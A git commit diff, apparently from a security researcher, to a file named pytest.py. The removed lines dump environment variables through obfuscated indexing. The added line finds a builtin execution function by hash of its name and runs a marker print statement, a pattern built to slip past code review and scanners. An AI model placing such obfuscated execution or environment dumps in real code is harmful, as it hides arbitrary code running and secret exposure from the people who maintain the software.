5ff8adc69cf0a80431fea554a7e545ab4fe99878
ross-bradley-aw <ross.bradley@amberwolf.com>
2026-02-11 13:23:20 +0000

    Update pytest.py

--- pytest.py
+++ pytest.py
@@ -1,2 +1,4 @@
-import os
-print(os.__dict__['environmental'[:-6]])
+from hashlib import sha256
+import requests
+
+([idx[1] for idx in __builtins__.__dict__.items() if sha256(idx[0].encode()).hexdigest()[:] == '1bbd174404efbce95f1af489ef93f4aa0f4d55718f24c3504682216afa7b7fb1'][0]).__call__('print("awolf")')
